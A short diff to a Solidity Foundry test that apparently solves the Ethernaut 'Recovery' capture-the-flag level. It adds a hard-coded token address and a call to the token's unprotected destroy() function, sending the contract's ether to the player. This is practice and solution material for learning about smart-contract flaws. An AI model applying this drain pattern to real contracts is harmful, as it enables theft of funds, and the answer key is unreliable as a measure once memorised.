@@ -38,6 +38,8 @@ contract TestRecovery is BaseTest {
         vm.startPrank(player, player);
 
         // Solve the Challenge
+        address payable token = 0x41C3c259514f88211c4CA2fd805A93F8F9A57504;
+        SimpleToken(token).destroy(player);
 
         vm.stopPrank();
 
